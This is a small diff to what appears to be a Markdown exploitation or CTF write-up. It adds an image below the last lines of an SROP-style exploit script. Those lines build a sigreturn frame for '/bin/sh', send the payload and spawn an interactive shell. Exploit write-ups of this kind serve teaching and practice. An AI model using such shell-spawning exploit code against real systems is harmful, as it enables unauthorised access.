@@ -601,3 +601,7 @@ pld += bytes(overwrite_signal_frame(bin_sh, syscall))
 p.sendline(pld) # send payload
 p.interactive() # spawn interactive shell
 ```
+
+<p align="center">
+  <img src="https://i.imgur.com/ZbPdAB6.png">
+</p>
